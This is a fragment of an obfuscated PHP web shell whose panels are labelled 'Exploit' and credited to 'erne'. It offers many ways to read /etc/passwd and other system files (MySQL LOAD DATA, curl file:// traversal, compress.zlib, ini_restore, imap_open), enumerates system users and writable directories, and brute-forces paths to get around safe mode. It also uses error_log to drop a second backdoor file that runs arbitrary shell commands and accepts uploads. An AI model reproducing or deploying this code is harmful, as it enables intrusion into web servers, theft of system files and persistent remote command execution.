'; $spda3331->headerform(array('content' => '<FONT COLOR=#9C9C9C>read file :</FONT><br>' . $spda3331->makeinput('Mohajer22', '/etc/passwd') . $spda3331->makeinput('', Show, 'Mohajer22', 'submit'))); $spda3331->headerform(array('content' => '<FONT COLOR=#9C9C9C>read file id:</FONT><br>' . $spda3331->makeid('plugin', 'cat /etc/passwd') . $spda3331->makeinput('', Show, 'plugin', 'submit'))); $spda3331->headerform(array('content' => '<FONT COLOR=#9C9C9C>read file CURL:</FONT><br>' . $spda3331->makeinput('curl', '/etc/passwd') . $spda3331->makeinput('', Show, 'curl', 'submit'))); $spda3331->headerform(array('content' => '<FONT COLOR=#9C9C9C>read file copy:</FONT><br>' . $spda3331->makeinput('copy', '/etc/passwd') . $spda3331->makeinput('', Show, 'copy', 'submit'))); $spda3331->headerform(array('content' => '<FONT COLOR=#9C9C9C>read file ini_restore:</FONT><br>' . $spda3331->makeinput('M2', '/etc/passwd') . $spda3331->makeinput('', Show, 'M2', 'submit'))); $spda3331->headerform(array('content' => '<FONT COLOR=#9C9C9C>read file or dir with imap:</FONT><br>' . $spda3331->makeimp('switch', '/etc/passwd') . $spda3331->makeinput('string', '/etc/passwd') . $spda3331->makeinput('string', 'Show', '', 'submit'))); $spda3331->headerform(array('content' => '<FONT COLOR=#9C9C9C>Make file ERORR:</FONT><br>' . $spda3331->makeinput('ER', 'Mohajer22.php') . $spda3331->makeinput('ER', 'Write', 'ER', 'submit'))); if (empty($_POST['Mohajer22'])) { } else { echo 'read file SQL', '<br>'; echo '<textarea method=\'POST\' cols=\'95\' rows=\'30\' wrar=\'off\' >'; $spa3ecf0 = $_POST['Mohajer22']; $sp11ae1c = '/etc/passwd:/proc/cpuinfo:/etc/resolv.conf:/etc/proftpd.conf'; $spa22966 = explode(':', $sp11ae1c); $spabcb3f = array("USE {$sp164cc8}", 'CREATE TEMPORARY TABLE ' . ($sp504554 = 'A' . time()) . ' (a LONGBLOB)', "LOAD DATA LOCAL INFILE '{$spa3ecf0}' INTO TABLE {$sp504554} FIELDS " . 'TERMINATED BY       \'__THIS_NEVER_HAPPENS__\' ' . 'ESCAPED BY          \'\' ' . 'LINES TERMINATED BY \'__THIS_NEVER_HAPPENS__\'', "SELECT a FROM {$sp504554} LIMIT 1"); mysql_connect($sp381623, $sp0d9cc6, $spb4fd46); foreach ($spabcb3f as $sp613b26) { $spa21634 = mysql_query($sp613b26); if ($spa21634 == false) { die('FAILED: ' . $sp613b26 . '
' . 'REASON: ' . mysql_error() . '
'); } if (!($spd6dd63 = @mysql_fetch_array($spa21634, MYSQL_NUM))) { continue; } echo htmlspecialchars($spd6dd63[0]); mysql_free_result($spa21634); } echo '</textarea>'; } if (empty($_POST['ER'])) { } else { $sp5c7dc4 = $_POST['ER']; echo error_log('
<html>
<head>
<title> Exploit: error_log() By * erne   * </title>
<body bgcolor="#000000">
<table Width=\'100%\' height=\'10%\' bgcolor=\'#D0D0D0\' border=\'1\'>
<tr>
<td><center><font size=\'6\' color=\'#BBB516\'> By  erne </font></center></td>
</tr>
</table>
<font color=\'#9C9C9C\'>
</head>
<?
if($fileup == ""){
ECHO " reade for up ";
}else{
$path= exec("pwd");
$path .= "/$fileup_name";
$CopyFile = copy($fileup,"$path");
if($CopyFile){
echo " up ok ";
}else{
echo " no up ";
}
}
if(empty($_POST[\'m\'])){
} else {
$m=$_POST[\'m\'];
echo  system($m);
}
if(empty($_POST[\'cmd\'])){
} else {
$h=  $_POST[\'cmd\'];
 print include($h) ;
}
?>
<form method=\'POST\' enctype=\'multipart/form-data\' >
<input type=\'file\' name=\'fileup\' size=\'20\'>
<input type=\'submit\' value=\'  up  \'>
</form>
<form method=\'POST\'  >
<input type=\'cmd\' name=\'cmd\' size=\'20\'>
<input type=\'submit\' value=\'  open (shill.txt) \'>
</form>
<form method=\'POST\' enctype=\'multipart/form-data\' >
<input type=\'text\' name=\'m\' size=\'20\'>
<input type=\'submit\' value=\'  run  \'>
<input type=\'reset\' value=\' reset \'>
</form>
', 3, $sp5c7dc4); } if ($_POST['plugin']) { echo 'read file id', '<br>'; echo '<textarea method=\'POST\' cols=\'95\' rows=\'30\' wrar=\'off\' >'; for ($spca6b76 = 0; $spca6b76 < 60000; $spca6b76++) { $spe68a84 = posix_getpwuid($spca6b76); if (!empty($spe68a84)) { while (list($sp8b00ef, $sp9c4d84) = each($spe68a84)) { print "{$sp9c4d84}:"; } print '
'; } } echo '</textarea>'; } if (empty($_POST['curl'])) { } else { echo 'read file CURL', '<br>'; echo '<textarea method=\'POST\' cols=\'95\' rows=\'30\' wrar=\'off\' >'; $sp838cde = $_POST['curl']; $sp8b1750 = curl_init('file:///' . $sp838cde . ' /../../../../../../../../../../../../' . __FILE__); curl_exec($sp8b1750); var_dump(curl_exec($sp8b1750)); echo '</textarea>'; } $spbf11e6 = ''; $spc62d5f = ''; if (empty($_POST['copy'])) { } else { echo 'read file copy', '<br>'; echo '<textarea method=\'POST\' cols=\'95\' rows=\'30\' wrar=\'off\' >'; $spbf11e6 = $_POST['copy']; $sp4eb460 = tempnam($spc62d5f, 'cx'); if (copy('compress.zlib://' . $spbf11e6, $sp4eb460)) { $sp67ff1a = fopen($sp4eb460, 'r'); $spf447af = fread($sp67ff1a, filesize($sp4eb460)); fclose($sp67ff1a); echo '' . htmlspecialchars($spf447af) . ''; unlink($sp4eb460); echo '</textarea>'; } else { die('<FONT COLOR="RED"><CENTER>Sorry... File
<B>' . htmlspecialchars($spbf11e6) . '</B> dosen\'t exists or you don\'t have
access.</CENTER></FONT>'); } } if (empty($_POST['M2'])) { } else { echo 'read file ini_restore', '<br> '; echo '<textarea method=\'POST\' cols=\'95\' rows=\'30\' wrar=\'off\' >'; $sp838cde = $_POST['M2']; echo ini_get('safe_mode'); echo ini_get('open_basedir'); $sp676578 = readfile("{$sp838cde}"); ini_restore('safe_mode'); ini_restore('open_basedir'); echo ini_get('safe_mode'); echo ini_get('open_basedir'); $sp676578 = readfile("{$sp838cde}"); echo '</textarea>'; } $sp5ecd68 = !empty($_POST['string']) ? $_POST['string'] : 0; $sp7a215f = !empty($_POST['switch']) ? $_POST['switch'] : 0; if ($sp5ecd68 && $sp7a215f == 'file') { echo 'read file imap', '<br>'; echo '<textarea method=\'POST\' cols=\'95\' rows=\'30\' wrar=\'off\' >'; $sp014958 = imap_open($sp5ecd68, '', ''); $sp6ff357 = imap_body($sp014958, 1); if (!empty($sp6ff357)) { echo '<pre>' . $sp6ff357 . '</pre>'; } imap_close($sp014958); echo '</textarea>'; } elseif ($sp5ecd68 && $sp7a215f == 'dir') { echo 'read  dir imap', '<br>'; echo '<textarea method=\'POST\' cols=\'95\' rows=\'30\' wrar=\'off\' >'; $sp014958 = imap_open('/etc/passwd', '', ''); if ($sp014958 == FALSE) { die('Can\'t open imap stream'); } $sp5ecd68 = explode('|', $sp5ecd68); if (count($sp5ecd68) > 1) { $spfa6c24 = imap_list($sp014958, trim($sp5ecd68[0]), trim($sp5ecd68[1])); } else { $spfa6c24 = imap_list($sp014958, trim($sp5ecd68[0]), '*'); } echo '<pre>'; for ($sp6c3e91 = 0; $sp6c3e91 < count($spfa6c24); $sp6c3e91++) { echo "{$spfa6c24[$sp6c3e91]}" . '<p>&nbsp;</p>'; } echo '</pre>'; imap_close($sp014958); echo '</textarea>'; } $spda3331->tdbody('</td></tr></table>'); $spda3331->tableheader(); $spda3331->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>Exploit: Open dir </b></td></tr></table>', 'center', 'top'); $spda3331->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td>'); if (empty($_POST['m'])) { echo "<div><FORM method='POST' action='{$sp7e9961}' enctype='multipart/form-data'>\n<table id=tb><tr><td><FONT COLOR=\"#9B9B9B\">path dir</FONT>\n<INPUT type='text' name='m' size=70 value='./'>\n<INPUT type='submit' value='show' id=input></td></tr></table></form></div>"; } else { $sp838cde = $_POST['m']; $sp15c9fb = $sp838cde; $sp49de29 = $sp838cde; $sp2f5e40 = intval(trim($_POST['method'])); $spc1a0af = opendir($sp49de29); $spe689a0 = array(); $sp6c3e91 = 0; while (false !== ($spa3ecf0 = readdir($spc1a0af))) { $sp19600a = "{$sp49de29}/{$spa3ecf0}"; $spca9917 = substr(sprintf('%o', fileperms($sp19600a)), -4); if (is_dir($sp19600a) && $spca9917 == '0777') { if (!file_exists('.*')) { $spe689a0[$sp6c3e91] = $spa3ecf0; $sp6c3e91++; } } } closedir($spc1a0af); clearstatcache(); echo '<strong><FONT COLOR=#9B9B9B>The folders is 777 :</strong><br />'; foreach ($spe689a0 as $spf7c94f) { echo $spf7c94f . '<br />'; } $spc1a0af = opendir($sp49de29); $spe689a0 = array(); $sp6c3e91 = 0; while (false !== ($sp606535 = readdir($spc1a0af))) { $sp19600a = "{$sp49de29}/{$sp606535}"; $spca9917 = substr(sprintf('%o', fileperms($sp19600a)), -4); if (is_dir($sp19600a) && $spca9917 == '0755') { if (!file_exists('.*')) { $spe689a0[$sp6c3e91] = $sp606535; $sp6c3e91++; } } } clearstatcache(); echo '</FONT><strong><FONT COLOR=#9B9B9B>The folders is 755 :</strong><br />'; foreach ($spe689a0 as $spf7c94f) { echo $spf7c94f . '<br />'; } $spc1a0af = opendir($sp49de29); $spe689a0 = array(); $sp6c3e91 = 0; while (false !== ($sp606535 = readdir($spc1a0af))) { $sp19600a = "{$sp49de29}/{$sp606535}"; $spca9917 = substr(sprintf('%o', fileperms($sp19600a)), -4); if (is_dir($sp19600a) && $spca9917 == '0644') { if (!file_exists('.*')) { $spe689a0[$sp6c3e91] = $sp606535; $sp6c3e91++; } } } clearstatcache(); echo '</FONT><strong><FONT COLOR=#9B9B9B>The folders is 644 :</strong><br />'; foreach ($spe689a0 as $spf7c94f) { echo $spf7c94f . '<br />'; } $spc1a0af = opendir($sp49de29); $spe689a0 = array(); $sp6c3e91 = 0; while (false !== ($sp606535 = readdir($spc1a0af))) { $sp19600a = "{$sp49de29}/{$sp606535}"; $spca9917 = substr(sprintf('%o', fileperms($sp19600a)), -4); if (is_dir($sp19600a) && $spca9917 == '0750') { if (!file_exists('.*')) { $spe689a0[$sp6c3e91] = $sp606535; $sp6c3e91++; } } } clearstatcache(); echo '</FONT><strong><FONT COLOR=#9B9B9B>The folders is 750 :</strong><br />'; foreach ($spe689a0 as $spf7c94f) { echo $spf7c94f . '<br />'; } $spc1a0af = opendir($sp49de29); $spe689a0 = array(); $sp6c3e91 = 0; while (false !== ($sp606535 = readdir($spc1a0af))) { $sp19600a = "{$sp49de29}/{$sp606535}"; $spca9917 = substr(sprintf('%o', fileperms($sp19600a)), -4); if (is_dir($sp19600a) && $spca9917 == '0604') { if (!file_exists('.*')) { $spe689a0[$sp6c3e91] = $sp606535; $sp6c3e91++; } } } clearstatcache(); echo '</FONT><strong><FONT COLOR=#9B9B9B>The folders is 604 :</strong><br />'; foreach ($spe689a0 as $spf7c94f) { echo $spf7c94f . '<br />'; } $spc1a0af = opendir($sp49de29); $spe689a0 = array(); $sp6c3e91 = 0; while (false !== ($sp606535 = readdir($spc1a0af))) { $sp19600a = "{$sp49de29}/{$sp606535}"; $spca9917 = substr(sprintf('%o', fileperms($sp19600a)), -4); if (is_dir($sp19600a) && $spca9917 == '0705') { if (!file_exists('.*')) { $spe689a0[$sp6c3e91] = $sp606535; $sp6c3e91++; } } } clearstatcache(); echo '</FONT><strong><FONT COLOR=#9B9B9B>The folders is 705 :</strong><br />'; foreach ($spe689a0 as $spf7c94f) { echo $spf7c94f . '<br />'; } $spc1a0af = opendir($sp49de29); $spe689a0 = array(); $sp6c3e91 = 0; while (false !== ($sp606535 = readdir($spc1a0af))) { $sp19600a = "{$sp49de29}/{$sp606535}"; $spca9917 = substr(sprintf('%o', fileperms($sp19600a)), -4); if (is_dir($sp19600a) && $spca9917 == '0606') { if (!file_exists('.*')) { $spe689a0[$sp6c3e91] = $sp606535; $sp6c3e91++; } } } clearstatcache(); echo '</FONT><strong><FONT COLOR=#9B9B9B>The folders is 606 :</strong><br />'; foreach ($spe689a0 as $spf7c94f) { echo $spf7c94f . '<br />'; } $spc1a0af = opendir($sp49de29); $spe689a0 = array(); $sp6c3e91 = 0; while (false !== ($sp606535 = readdir($spc1a0af))) { $sp19600a = "{$sp49de29}/{$sp606535}"; $spca9917 = substr(sprintf('%o', fileperms($sp19600a)), -4); if (is_dir($sp19600a) && $spca9917 == '0703') { if (!file_exists('.*')) { $spe689a0[$sp6c3e91] = $sp606535; $sp6c3e91++; } } } clearstatcache(); echo '</FONT><strong><FONT COLOR=#9B9B9B>The folders is 703 :</strong><br />'; foreach ($spe689a0 as $spf7c94f) { echo $spf7c94f . '<br />'; } } $spc1a0af = opendir($sp49de29); $spe689a0 = array(); $sp6c3e91 = 0; while (false !== ($sp606535 = readdir($spc1a0af))) { $sp19600a = "{$sp49de29}/{$sp606535}"; $spca9917 = substr(sprintf('%o', fileperms($sp19600a)), -4); $spe689a0[$sp6c3e91] = $sp606535; $sp6c3e91++; } clearstatcache(); echo '</FONT><strong><FONT COLOR=#9B9B9B>www.alturks.com :</strong><br />'; foreach ($spe689a0 as $spf7c94f) { echo $spf7c94f . '<br />'; } echo '</FONT><strong><FONT COLOR=#9C9C9C>ernealizm: </strong>' . $sp6c3e91 . '</FONT><br />'; $spda3331->tdbody('</td></tr></table>'); echo '[syslog]08
'; $spda3331->tableheader(); $spda3331->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>Exploit: break fucking safe-mode </b></td></tr></table>', 'center', 'top'); $spda3331->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td>'); error_reporting(E_WARNING); ini_set('display_errors', 1); echo '<head><title>' . getcwd() . '</title></head>'; echo '<form method=POST>'; echo "<div style='float: left'><FONT COLOR=\"#9B9B9B\">Root directory: </FONT><input type=text name=root value='{$_POST['root']}'></div>"; echo '<input type=submit value=\'--&raquo;\'></form>'; $spa53341 = '/'; if ($_POST['root']) { $spa53341 = $_POST['root']; } if (!ini_get('safe_mode')) { die('<font size=-2 face=verdana color=\'#9B9B9B\'>Safe-mode is OFF.</font>'); } echo '<textarea method=\'POST\' cols=\'95\' rows=\'30\' wrar=\'off\' >'; $sp76d016 = 0; $sp7646df = array(); set_error_handler('eh'); $sp451e15 = '_-.01234567890abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; for ($sp6c3e91 = 0; $sp6c3e91 < strlen($sp451e15); $sp6c3e91++) { $sp49de29 = "{$spa53341}" . (substr($spa53341, -1) != '/' ? '/' : NULL) . "{$sp451e15[$sp6c3e91]}"; $spdd00c5 = $sp7646df[count($sp7646df) - 1]; glob($sp49de29 . '*'); if ($sp7646df[count($sp7646df) - 1] != $spdd00c5) { for ($spc9281a = 0; $spc9281a < strlen($sp451e15); $spc9281a++) { $sp49de29 = "{$spa53341}" . (substr($spa53341, -1) != '/' ? '/' : NULL) . "{$sp451e15[$sp6c3e91]}{$sp451e15[$spc9281a]}"; $sp0de41f = $sp7646df[count($sp7646df) - 1]; glob($sp49de29 . '*'); if ($sp7646df[count($sp7646df) - 1] != $sp0de41f) { for ($sp0992ce = 0; $sp0992ce < strlen($sp451e15); $sp0992ce++) { $sp49de29 = "{$spa53341}" . (substr($spa53341, -1) != '/' ? '/' : NULL) . "{$sp451e15[$sp6c3e91]}{$sp451e15[$spc9281a]}{$sp451e15[$sp0992ce]}"; $spbca371 = $sp7646df[count($sp7646df) - 1]; glob($sp49de29 . '*'); if ($sp7646df[count($sp7646df) - 1] != $spbca371) { for ($spd6dd63 = 0; $spd6dd63 < strlen($sp451e15); $spd6dd63++) { $sp49de29 = "{$spa53341}" . (substr($spa53341, -1) != '/' ? '/' : NULL) . "{$sp451e15[$sp6c3e91]}{$sp451e15[$spc9281a]}{$sp451e15[$sp0992ce]}{$sp451e15[$spd6dd63]}"; glob($sp49de29 . '*'); } } } } } } } $sp7646df = array_unique($sp7646df); foreach ($sp7646df as $sp63375d) { echo "{$sp63375d}\n"; } function eh($spfe6fb7, $sp2ea0cc, $spc9bb75, $spad1ed5) { global $sp7646df, $sp76d016, $sp6c3e91; preg_match('/SAFE\\ MODE\\ Restriction\\ in\\ effect\\..*whose\\ uid\\ is(.*)is\\ not\\ allowed\\ to\\ access(.*)owned by uid(.*)/', $sp2ea0cc, $spf60383); if ($spf60383) { $sp7646df[$sp76d016] = $spf60383[2]; $sp76d016++; } } echo '</textarea>'; $spda3331->tdbody('</td></tr></table>'); echo '[syslog]09
';